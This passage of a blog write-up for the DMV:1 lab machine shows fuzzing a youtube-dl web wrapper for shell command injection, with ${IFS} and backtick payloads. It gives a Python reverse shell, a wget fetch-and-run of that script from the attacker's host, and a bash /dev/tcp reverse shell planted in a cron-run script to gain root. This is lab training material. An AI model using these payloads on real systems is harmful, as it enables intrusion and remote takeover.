+<span class="p">{</span><span class="s">"status"</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="s">"errors"</span><span class="p">:</span> <span class="s">"sh: 1: Syntax error: Unterminated quoted string \ n"</span><span class="p">,</span> <span class="s">"url_orginal"</span><span class="p">:</span> <span class="s">"</span><span class="se">\"</span><span class="s"> "</span><span class="p">,</span><span class="s">" output "</span><span class="p">:</span><span class="s">" "</span><span class="p">,</span><span class="s">" result_url "</span><span class="p">:</span><span class="s">" \ / tmp \ / downloads \ /5ed76e43df7cc.mp3 "</span><span class="p">}</span>
+
+
+<span class="n">TRYING</span><span class="p">:</span> <span class="o">&amp;</span> <span class="o">=====================================</span>
+
+<span class="p">{</span><span class="s">"status"</span><span class="p">:</span> <span class="mi">127</span><span class="p">,</span> <span class="s">"errors"</span><span class="p">:</span> <span class="s">"sh: 1: -f: not found \ nWARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this. \ nUsage : youtube-dl [OPTIONS] URL [URL ...] \ n \ nyoutube-dl: error: You must provide at least one URL. \ nType youtube-dl --help to see a list of all options. \ n "</span> <span class="p">,</span> <span class="s">"url_orginal"</span><span class="p">:</span> <span class="s">"&amp;"</span><span class="p">,</span> <span class="s">"output "</span><span class="p">:</span><span class="s">" "</span><span class="p">,</span><span class="s">" result_url "</span><span class="p">:</span><span class="s">" \ / tmp \ / downloads \ /5ed76e4733f9e.mp3 "</span><span class="p">}</span>
+<span class="n">TRYING</span><span class="p">:</span> <span class="s">'=====================================
+
+{"status": 2, "errors": "sh: 1: Syntax error: </span><span class="se">\"</span><span class="s"> (\ "unexpected \ n", "url_orginal": "'", "</span><span class="n">output</span><span class="s">": "", "</span><span class="n">result_url</span><span class="s">": "</span>\ <span class="o">/</span><span class="n">tmp</span>\<span class="o">/</span><span class="n">downloads</span>\<span class="o">/</span><span class="mi">5</span><span class="n">ed76e47e8c4e</span><span class="p">.</span><span class="n">mp3</span> <span class="s">"}
+TRYING: (=====================================
+
+{"</span><span class="n">status</span><span class="s">": 2, "</span><span class="n">errors</span><span class="s">": "</span><span class="n">sh</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Syntax</span> <span class="n">error</span><span class="p">:</span> \<span class="s">" (\ "</span><span class="n">unexpected</span> \ <span class="n">n</span><span class="s">", "</span><span class="n">url_orginal</span><span class="s">": "</span><span class="p">(</span><span class="s">", "</span><span class="n">output</span><span class="s">": "", "</span><span class="n">result_url</span><span class="s">": "</span>\ <span class="o">/</span><span class="n">tmp</span>\<span class="o">/</span><span class="n">downloads</span>\<span class="o">/</span><span class="mi">5</span><span class="n">ed76e47ea248</span><span class="p">.</span><span class="n">mp3</span> <span class="s">"}
+TRYING :) =====================================
+
+{"</span><span class="n">status</span><span class="s">": 2, "</span><span class="n">errors</span><span class="s">": "</span><span class="n">sh</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Syntax</span> <span class="n">error</span><span class="p">:</span> \<span class="s">") \ "</span><span class="n">unexpected</span> \ <span class="n">n</span><span class="s">", "</span><span class="n">url_orginal</span><span class="s">": "</span><span class="p">)</span><span class="s">", "</span><span class="n">output</span><span class="s">": "", "</span><span class="n">result_url</span><span class="s">": "</span>\ <span class="o">/</span><span class="n">tmp</span>\<span class="o">/</span><span class="n">downloads</span>\<span class="o">/</span><span class="mi">5</span><span class="n">ed76e47eb86b</span><span class="p">.</span><span class="n">mp3</span> <span class="s">"}
+
+
+TRYING:; =====================================
+
+{"</span><span class="n">status</span><span class="s">": 127, "</span><span class="n">errors</span><span class="s">": "</span><span class="n">WARNING</span><span class="p">:</span> <span class="n">Assuming</span> <span class="o">--</span><span class="n">restrict</span><span class="o">-</span><span class="n">filenames</span> <span class="n">since</span> <span class="nb">file</span> <span class="n">system</span> <span class="n">encoding</span> <span class="n">cannot</span> <span class="n">encode</span> <span class="nb">all</span> <span class="n">characters</span><span class="p">.</span> <span class="n">Set</span> <span class="n">the</span> <span class="n">LC_ALL</span> <span class="n">environment</span> <span class="n">variable</span> <span class="n">to</span> <span class="n">fix</span> <span class="n">this</span><span class="p">.</span> \ <span class="n">nUsage</span><span class="p">:</span> <span class="n">youtube</span><span class="o">-</span><span class="n">dl</span> <span class="p">[</span><span class="n">OPTIONS</span><span class="p">]</span> <span class="n">URL</span> <span class="p">[</span><span class="n">URL</span> <span class="p">...]</span> \ <span class="n">n</span> \ <span class="n">nyoutube</span><span class="o">-</span><span class="n">dl</span><span class="p">:</span> <span class="n">error</span><span class="p">:</span> <span class="n">You</span> <span class="n">must</span> <span class="n">provide</span> <span class="n">at</span> <span class="n">least</span> <span class="n">one</span> <span class="n">URL</span><span class="p">.</span> \ <span class="n">nType</span> <span class="n">youtube</span><span class="o">-</span><span class="n">dl</span> <span class="o">--</span><span class="n">help</span> <span class="n">to</span> <span class="n">see</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="nb">all</span> <span class="n">options</span><span class="p">.</span> \ <span class="n">nsh</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> <span class="o">-</span><span class="n">f</span><span class="p">:</span> <span class="ow">not</span> <span class="n">found</span> \ <span class="n">n</span> <span class="s">" , "</span><span class="n">url_orginal</span><span class="s">": "</span><span class="p">;</span><span class="s">", "</span><span class="n">output</span><span class="s">": "", "</span><span class="n">result_url</span><span class="s">": "</span>\ <span class="o">/</span> <span class="n">tmp</span> \ <span class="o">/</span> <span class="n">downloads</span> \ <span class="o">/</span><span class="mi">5</span><span class="n">ed76e5027755</span><span class="p">.</span><span class="n">mp3</span><span class="s">"}
+
+{"</span><span class="n">status</span><span class="s">": 2, "</span><span class="n">errors</span><span class="s">": "</span><span class="n">sh</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Syntax</span> <span class="n">error</span><span class="p">:</span> <span class="n">EOF</span> <span class="ow">in</span> <span class="n">backquote</span> <span class="n">substitution</span> \ <span class="n">n</span><span class="s">", "</span><span class="n">url_orginal</span><span class="s">": "" "</span><span class="p">,</span><span class="s">" output "</span><span class="p">:</span><span class="s">" "</span><span class="p">,</span><span class="s">" result_url "</span><span class="p">:</span><span class="s">" \ / tmp \ / downloads \ /5ed76e5d991f2.mp3 "</span><span class="p">}</span>
+
+<span class="n">TRYING</span><span class="p">:</span> <span class="o">|</span> <span class="o">=====================================</span>
+
+<span class="p">{</span><span class="s">"status"</span><span class="p">:</span> <span class="mi">127</span><span class="p">,</span> <span class="s">"errors"</span><span class="p">:</span> <span class="s">"sh: 1: -f: not found \ nWARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this. \ nUsage : youtube-dl [OPTIONS] URL [URL ...] \ n \ nyoutube-dl: error: You must provide at least one URL. \ nType youtube-dl --help to see a list of all options. \ n "</span> <span class="p">,</span> <span class="s">"url_orginal"</span><span class="p">:</span> <span class="s">"|"</span><span class="p">,</span> <span class="s">"output"</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span> <span class="s">"result_url"</span><span class="p">:</span> <span class="s">"\ / tmp \ / downloads \ /5ed76e5ecc62e.mp3"</span><span class="p">}</span>
+
+<span class="p">[</span><span class="s">'"'</span><span class="p">,</span> <span class="s">'&amp;'</span><span class="p">,</span><span class="s">" '"</span><span class="p">,</span><span class="s">' ('</span><span class="p">,</span><span class="s">') '</span><span class="p">,</span><span class="s">'; '</span><span class="p">,</span><span class="s">'` '</span><span class="p">,</span><span class="s">' | '</span><span class="p">]</span>
+
+</pre></table></code></div></div><h2 id="exploitation">EXPLOITATION</h2><p>So we have filtered characters that will evaluate to bash One of the signs that were positively checked was “` “. It’s called “backquote”. This cookie is one of the ways of executing a command in another command. When this nested command is executed, its result will go to the “before” command. In our case, this original command with the result of a nested command will almost always return an error. The whole thing is that the server processes errors incorrectly, displaying them to us in communication Let’s change the variable “date” to</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="p">{</span><span class="s">'yt_url'</span><span class="p">:</span> <span class="s">''</span><span class="p">.</span> <span class="n">join</span> <span class="p">(</span><span class="n">ch</span><span class="p">)</span> <span class="o">+</span> <span class="s">'`pwd`'</span><span class="p">}</span>
+</pre></table></code></div></div><p>After executing the script, many of the characters gave a value</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>sh: 1: <span class="se">\ </span>/ var <span class="se">\ </span>/ www <span class="se">\ </span>/ html: Permission denied
+</pre></table></code></div></div><p>So it’s time to filter the characters further. We change the condition to</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="s">"sh: 1:"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span> <span class="ow">and</span> <span class="s">"\ / var \ / www \ / html"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+</pre></table></code></div></div><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+</pre><td class="rouge-code"><pre><span class="err">$</span> <span class="n">python3</span> <span class="n">DMV</span><span class="p">:</span> <span class="mi">1</span><span class="n">_script</span><span class="p">.</span><span class="n">py</span>
+<span class="err">!</span> <span class="s">"# $% &amp; '() * +, -. / :; &lt;=&gt;? @ [\] ^ _` {|} ~
+
+
+TRYING: &amp; =====================================
+
+{"</span><span class="n">status</span><span class="s">": 126, "</span><span class="n">errors</span><span class="s">": "</span><span class="n">sh</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> \ <span class="o">/</span> <span class="n">var</span> \ <span class="o">/</span> <span class="n">www</span> \ <span class="o">/</span> <span class="n">html</span><span class="p">:</span> <span class="n">Permission</span> <span class="n">denied</span> \ <span class="n">nWARNING</span><span class="p">:</span> <span class="n">Assuming</span> <span class="o">--</span><span class="n">restrict</span><span class="o">-</span><span class="n">filenames</span> <span class="n">since</span> <span class="nb">file</span> <span class="n">system</span> <span class="n">encoding</span> <span class="n">cannot</span> <span class="n">encode</span> <span class="nb">all</span> <span class="n">characters</span><span class="p">.</span> <span class="n">Set</span> <span class="n">the</span> <span class="n">LC_ALL</span> <span class="n">environment</span> <span class="n">variable</span> <span class="n">to</span> <span class="n">fix</span> <span class="n">this</span><span class="p">.</span> \ <span class="n">nUsage</span><span class="p">:</span> <span class="n">youtube</span><span class="o">-</span><span class="n">dl</span> <span class="p">[</span><span class="n">OPTIONS</span><span class="p">]</span> <span class="n">URL</span> <span class="p">[</span><span class="n">URL</span> <span class="p">...]</span> \ <span class="n">n</span> \ <span class="n">nyoutube</span><span class="o">-</span><span class="n">dl</span><span class="p">:</span> <span class="n">error</span><span class="p">:</span> <span class="n">You</span> <span class="n">must</span> <span class="n">provide</span> <span class="n">at</span> <span class="n">least</span> <span class="n">one</span> <span class="n">URL</span><span class="p">.</span> \ <span class="n">nType</span> <span class="n">youtube</span><span class="o">-</span><span class="n">dl</span> <span class="o">--</span><span class="n">help</span> <span class="n">to</span> <span class="n">see</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="nb">all</span> <span class="n">options</span><span class="p">.</span> \ <span class="n">n</span> <span class="s">","</span> <span class="n">url_orginal</span> <span class="s">":"</span> <span class="o">&amp;</span> <span class="sb">`pwd`</span><span class="s">", "</span><span class="n">output</span><span class="s">": "", "</span><span class="n">result_url</span><span class="s">": "</span>\ <span class="o">/</span> <span class="n">tmp</span> \ <span class="o">/</span> <span class="n">downloads</span> \ <span class="o">/</span><span class="mi">5</span><span class="n">ed7740393c9d</span><span class="p">.</span><span class="n">mp3</span><span class="s">"}
+
+
+TRYING:; =====================================
+
+{"</span><span class="n">status</span><span class="s">": 126, "</span><span class="n">errors</span><span class="s">": "</span><span class="n">WARNING</span><span class="p">:</span> <span class="n">Assuming</span> <span class="o">--</span><span class="n">restrict</span><span class="o">-</span><span class="n">filenames</span> <span class="n">since</span> <span class="nb">file</span> <span class="n">system</span> <span class="n">encoding</span> <span class="n">cannot</span> <span class="n">encode</span> <span class="nb">all</span> <span class="n">characters</span><span class="p">.</span> <span class="n">Set</span> <span class="n">the</span> <span class="n">LC_ALL</span> <span class="n">environment</span> <span class="n">variable</span> <span class="n">to</span> <span class="n">fix</span> <span class="n">this</span><span class="p">.</span> \ <span class="n">nUsage</span><span class="p">:</span> <span class="n">youtube</span><span class="o">-</span><span class="n">dl</span> <span class="p">[</span><span class="n">OPTIONS</span><span class="p">]</span> <span class="n">URL</span> <span class="p">[</span><span class="n">URL</span> <span class="p">...]</span> \ <span class="n">n</span> \ <span class="n">nyoutube</span><span class="o">-</span><span class="n">dl</span><span class="p">:</span> <span class="n">error</span><span class="p">:</span> <span class="n">You</span> <span class="n">must</span> <span class="n">provide</span> <span class="n">at</span> <span class="n">least</span> <span class="n">one</span> <span class="n">URL</span><span class="p">.</span> \ <span class="n">nType</span> <span class="n">youtube</span><span class="o">-</span><span class="n">dl</span> <span class="o">--</span><span class="n">help</span> <span class="n">to</span> <span class="n">see</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="nb">all</span> <span class="n">options</span><span class="p">.</span> \ <span class="n">nsh</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> \ <span class="o">/</span> <span class="n">var</span> \ <span class="o">/</span> <span class="n">www</span> \ <span class="o">/</span> <span class="n">html</span><span class="p">:</span> <span class="n">Permission</span> <span class="n">denied</span> \ <span class="n">n</span> <span class="s">","</span> <span class="n">url_orginal</span> <span class="s">":"</span><span class="p">;</span> <span class="sb">`pwd`</span><span class="s">", "</span><span class="n">output</span><span class="s">": "", "</span><span class="n">result_url</span><span class="s">": "</span>\ <span class="o">/</span> <span class="n">tmp</span> \ <span class="o">/</span> <span class="n">downloads</span> \ <span class="o">/</span><span class="mi">5</span><span class="n">ed7740c6b034</span><span class="p">.</span><span class="n">mp3</span><span class="s">"}
+
+TRYING:&gt; =====================================
+
+{"</span><span class="n">status</span><span class="s">": 2, "</span><span class="n">errors</span><span class="s">": "</span><span class="n">sh</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> <span class="n">cannot</span> <span class="n">create</span> \ <span class="o">/</span> <span class="n">var</span> \ <span class="o">/</span> <span class="n">www</span> \ <span class="o">/</span> <span class="n">html</span><span class="p">:</span> <span class="n">Is</span> <span class="n">a</span> <span class="n">directory</span> \ <span class="n">n</span><span class="s">", "</span><span class="n">url_orginal</span><span class="s">": "</span><span class="o">&gt;</span><span class="sb">` pwd`</span> <span class="s">","</span> <span class="n">output</span> <span class="s">": "", "</span><span class="n">result_url</span><span class="s">": "</span>\ <span class="o">/</span> <span class="n">tmp</span> \ <span class="o">/</span> <span class="n">downloads</span> \ <span class="o">/</span><span class="mi">5</span><span class="n">ed7740e7c7a1</span><span class="p">.</span><span class="n">mp3</span><span class="s">"}
+
+
+TRYING: | =====================================
+
+{"</span><span class="n">status</span><span class="s">": 126, "</span><span class="n">errors</span><span class="s">": "</span><span class="n">sh</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> \ <span class="o">/</span> <span class="n">var</span> \ <span class="o">/</span> <span class="n">www</span> \ <span class="o">/</span> <span class="n">html</span><span class="p">:</span> <span class="n">Permission</span> <span class="n">denied</span> \ <span class="n">nWARNING</span><span class="p">:</span> <span class="n">Assuming</span> <span class="o">--</span><span class="n">restrict</span><span class="o">-</span><span class="n">filenames</span> <span class="n">since</span> <span class="nb">file</span> <span class="n">system</span> <span class="n">encoding</span> <span class="n">cannot</span> <span class="n">encode</span> <span class="nb">all</span> <span class="n">characters</span><span class="p">.</span> <span class="n">Set</span> <span class="n">the</span> <span class="n">LC_ALL</span> <span class="n">environment</span> <span class="n">variable</span> <span class="n">to</span> <span class="n">fix</span> <span class="n">this</span><span class="p">.</span> \ <span class="n">nUsage</span><span class="p">:</span> <span class="n">youtube</span><span class="o">-</span><span class="n">dl</span> <span class="p">[</span><span class="n">OPTIONS</span><span class="p">]</span> <span class="n">URL</span> <span class="p">[</span><span class="n">URL</span> <span class="p">...]</span> \ <span class="n">n</span> \ <span class="n">nyoutube</span><span class="o">-</span><span class="n">dl</span><span class="p">:</span> <span class="n">error</span><span class="p">:</span> <span class="n">You</span> <span class="n">must</span> <span class="n">provide</span> <span class="n">at</span> <span class="n">least</span> <span class="n">one</span> <span class="n">URL</span><span class="p">.</span> \ <span class="n">nType</span> <span class="n">youtube</span><span class="o">-</span><span class="n">dl</span> <span class="o">--</span><span class="n">help</span> <span class="n">to</span> <span class="n">see</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="nb">all</span> <span class="n">options</span><span class="p">.</span> \ <span class="n">n</span> <span class="s">","</span> <span class="n">url_orginal</span> <span class="s">":"</span> <span class="o">|</span> <span class="sb">`pwd`</span><span class="s">", "</span><span class="n">output</span><span class="s">": "", "</span><span class="n">result_url</span><span class="s">": "</span>\ <span class="o">/</span> <span class="n">tmp</span> \ <span class="o">/</span> <span class="n">downloads</span> \ <span class="o">/</span><span class="mi">5</span><span class="n">ed7741744d6e</span><span class="p">.</span><span class="n">mp3</span><span class="s">"}
+TRYING:} =====================================
+
+['&amp;', ';', '&gt;', '|']
+</span></pre></table></code></div></div><p>Many of these characters are just special characters in bash. The “&gt;” sign, however, gives us extraordinary results. It does not return an authorization error. But how to replace spaces so that we do not cut off the rest of the command? There is a bash environment variable named ‘’ $ {IFS} ‘’ ‘Internal Field Separator’. Let’s check another command. This time ls. Our payload looks like this:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="s">'yt_url'</span><span class="p">:</span> <span class="s">''</span>
+</pre></table></code></div></div><p>Here are the results:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="err">!</span> <span class="s">"# $% &amp; '() * +, -. / :; &lt;=&gt;? @ [\] ^ _` {|} ~
+{"</span><span class="n">status</span><span class="s">": 2, "</span><span class="n">errors</span><span class="s">": "</span><span class="n">sh</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> <span class="n">cannot</span> <span class="n">create</span> \ <span class="n">t</span> \ <span class="n">n</span> \ <span class="n">t</span> \ <span class="n">n</span> <span class="o">-</span> <span class="k">exec</span> <span class="o">+</span> <span class="n">whoami</span> \ <span class="n">n</span> <span class="o">-</span> <span class="k">exec</span> <span class="o">+</span> <span class="n">whoami</span> \ <span class="n">n</span> <span class="o">-</span> <span class="k">exec</span> <span class="o">+</span> <span class="n">whoami</span> \ <span class="n">nf</span> \ <span class="n">nadmin</span> \ <span class="n">nimages</span> \ <span class="n">nindex</span><span class="p">.</span><span class="n">php</span> \ <span class="n">njs</span> \ <span class="n">nstyle</span><span class="p">.</span><span class="n">css</span> \ <span class="n">ntmp</span> \ <span class="n">nf</span> \ <span class="n">nadmin</span> \ <span class="n">nimages</span> \ <span class="n">nindex</span><span class="p">.</span><span class="n">php</span> \ <span class="n">njs</span> \ <span class="n">nstyle</span><span class="p">.</span><span class="n">css</span> \ <span class="n">ntmp</span> \ <span class="n">n</span> <span class="o">-</span> <span class="k">exec</span> <span class="o">+</span> <span class="n">whoami</span> \ <span class="n">nf</span> \ <span class="n">nadmin</span> \ <span class="n">nimages</span> \ <span class="n">nindex</span><span class="p">.</span><span class="n">php</span> \ <span class="n">njs</span> \ <span class="n">nstyle</span><span class="p">.</span><span class="n">css</span> \ <span class="n">ntmp</span> \ <span class="n">nf</span> \ <span class="n">nadmin</span> \ <span class="n">nimages</span> \ <span class="n">nindex</span><span class="p">.</span><span class="n">php</span> \ <span class="n">njs</span> \ <span class="n">nstyle</span><span class="p">.</span><span class="n">css</span> \ <span class="n">ntmp</span> \ <span class="n">n</span> <span class="o">-</span> <span class="k">exec</span> <span class="o">+</span> <span class="n">whoami</span> \ <span class="n">n</span> <span class="o">-</span> <span class="k">exec</span> <span class="o">+</span> <span class="n">whoami</span> \ <span class="n">n</span> <span class="o">-</span> <span class="k">exec</span> <span class="o">+</span> <span class="n">whoami</span> \ <span class="n">nf</span> \ <span class="n">nadmin</span> \ <span class="n">nimages</span> \ <span class="n">nindex</span><span class="p">.</span><span class="n">php</span> \ <span class="n">njs</span> \ <span class="n">nstyle</span><span class="p">.</span><span class="n">css</span> \ <span class="n">ntmp</span> \ <span class="n">nf</span> \ <span class="n">nadmin</span> \ <span class="n">nimages</span> \ <span class="n">nindex</span><span class="p">.</span><span class="n">php</span> \ <span class="n">njs</span> \ <span class="n">nstyle</span><span class="p">.</span><span class="n">css</span> \ <span class="n">ntmp</span> \ <span class="n">n</span> <span class="o">-</span> <span class="k">exec</span> <span class="o">+</span> <span class="n">whoami</span> \ <span class="n">nf</span> \ <span class="n">nadmin</span> \ <span class="n">nimages</span> \ <span class="n">nindex</span><span class="p">.</span><span class="n">php</span> \ <span class="n">njs</span> \ <span class="n">nstyle</span><span class="p">.</span><span class="n">css</span> \ <span class="n">ntmp</span> \ <span class="n">nf</span> \ <span class="n">nadmin</span> \ <span class="n">nimages</span> \ <span class="n">nindex</span><span class="p">.</span><span class="n">php</span> \ <span class="n">njs</span> \ <span class="n">nstyle</span><span class="p">.</span><span class="n">css</span> \ <span class="n">ntmp</span><span class="p">:</span> <span class="n">File</span> <span class="n">name</span> <span class="n">too</span> <span class="nb">long</span> \ <span class="n">n</span> <span class="s">","</span> <span class="n">url_orginal</span> <span class="s">":"</span><span class="o">&gt;</span> <span class="err">$</span> <span class="p">{</span><span class="n">IFS</span><span class="p">}</span> <span class="sb">`ls`</span><span class="s">", "</span><span class="n">output</span> <span class="s">":"</span> <span class="s">","</span> <span class="n">result_url</span> <span class="s">":"</span> \ <span class="o">/</span> <span class="n">tmp</span> \ <span class="o">/</span> <span class="n">downloads</span> \ <span class="o">/</span><span class="mi">5</span><span class="n">ed7775d89d70</span><span class="p">.</span><span class="n">mp3</span> <span class="s">"}
+</span></pre></table></code></div></div><h2 id="enumeration">ENUMERATION</h2><p>Apparently we have RCE;). We can start creating a reverse shell. It will be a simple payload taken from pentestmonkey.net. We will also create a separate folder for this file. Payload looks like this:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">subprocess</span><span class="p">,</span> <span class="n">os</span><span class="p">;</span> <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span> <span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span> <span class="n">s</span><span class="p">.</span><span class="n">connect</span> <span class="p">((</span><span class="s">"192.168.56.xxx"</span><span class="p">,</span> <span class="mi">1234</span><span class="p">));</span> <span class="n">os</span><span class="p">.</span><span class="n">dup2</span> <span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span> <span class="p">(),</span> <span class="mi">0</span> <span class="p">);</span> <span class="n">os</span><span class="p">.</span><span class="n">dup2</span> <span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span> <span class="p">(),</span> <span class="mi">1</span><span class="p">);</span> <span class="n">os</span><span class="p">.</span><span class="n">dup2</span> <span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span> <span class="p">(),</span> <span class="mi">2</span><span class="p">);</span> <span class="n">p</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">call</span> <span class="p">([</span><span class="s">"/ bin / sh"</span><span class="p">,</span> <span class="s">"- i"</span><span class="p">]);</span> <span class="sb">``</span><span class="err">`</span>
+<span class="n">We</span> <span class="n">create</span> <span class="n">a</span> <span class="nb">file</span> <span class="n">called</span> <span class="n">rev</span><span class="p">.</span><span class="n">py</span> <span class="ow">and</span> <span class="n">put</span> <span class="n">payload</span> <span class="n">there</span>
+</pre></table></code></div></div><p>It would be a cool thing to send this payload with <code class="language-plaintext highlighter-rouge">wget</code>. For this, we need to create a page from which the server will download the payload. We do it with the help of the brilliant “SimpleHTTPServer” library in python.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>python <span class="nt">-m</span> SimpleHTTTPServer 8080
+</pre></table></code></div></div><p>Also, let’s listen on port 1234 with netcat.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> nc -lvp 1234
+</pre></table></code></div></div><p>Let’s make a request to the server. The variable “data” will be <code class="language-plaintext highlighter-rouge">{'yt_url': '\ x3e`cd $ {IFS} / var / www / html / images /; wget $ {IFS} http://192.168.56.103:8080/rev. py; python $ {IFS} rev.py` '}</code>.</p><p>I can’t show it to you now, but we have a shell :)</p><p>in the folder / var / www / html / admin there is a flag with the value <code class="language-plaintext highlighter-rouge">flag {0d8486a0c0c42503bb60ac77f4046ed7}</code></p><p><strong><em>USER FLAG EARNED</em></strong> Now it remains to get the root flag. We have rights to directories only in / tmp and in the aforementioned / var / www / html / images. In the tmp directory, however, we see a clean.sh script</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ cat clean.sh
+rm -rf downloads
+</pre></table></code></div></div><p>This script only does what it does is delete the downloads folder. But we see after executing <code class="language-plaintext highlighter-rouge">ls -la</code> that we got write access to it. This is an example of a script that seems to be scheduled now and then. Let’s edit it to have a reverse shell as well, this time we’ll create it in bash. We will take the script from pentestmonkey.com again. We add to the script</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>bash -i&gt; &amp; /dev/tcp/10.0.0.1/8080 0&gt; &amp; 1
+</pre></table></code></div></div><p>After listening to the port again, we manage to get to the shell with root privileges. In the / root directory there is a root.txt file with the flag <code class="language-plaintext highlighter-rouge">flag {d9b368018e912b541a4eb68399c5e94a}</code></p><p><strong><em>ROOT FLAG CAPTURED</em></strong></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/blog/categories/vulnhub/'>VulnHub</a>, <a href='/blog/categories/dmv/'>DMV</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/blog/tags/python-requests/" class="post-tag no-text-decoration" >python-requests</a> <a href="/blog/tags/reverse-shell/" class="post-tag no-text-decoration" >reverse-shell</a> <a href="/blog/tags/waf-bypassing/" class="post-tag no-text-decoration" >waf-bypassing</a> <a href="/blog/tags/crontabs/" class="post-tag no-text-decoration" >crontabs</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=DMV:1 - WRITE-UP - Cloufish's Blog&url=https://cloufish.github.io/blog/posts/dmv1-en/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=DMV:1 - WRITE-UP - Cloufish's Blog&u=https://cloufish.github.io/blog/posts/dmv1-en/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=DMV:1 - WRITE-UP - Cloufish's Blog&url=https://cloufish.github.io/blog/posts/dmv1-en/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/blog/posts/Can-OWASP-ZAP-replace-Burp-Suite-Professional/">Can OWASP ZAP replace Burp Suite Professional?</a><li><a href="/blog/posts/OWASP-ZAP-as-a-great-fuzzing-tool/">OWASP-ZAP-Fuzzer is it a great alternative for Burp-Suite Intruder?</a><li><a href="/blog/posts/Setting-up-zap-scan-in-cicd-pipeline/">Setting up ZAP Scan in CI/CD pipeline</a><li><a href="/blog/posts/Setting-Up-Hashicorp-Vault-To-Manage-Github-Token/">Setting up Hashicorp Vault to manage our Github Token</a><li><a href="/blog/posts/Preventing-Insufficient-Logging-and-Monitoring/">Concept of Preventing Insufficient Logging & Monitoring</a></ul></div><div 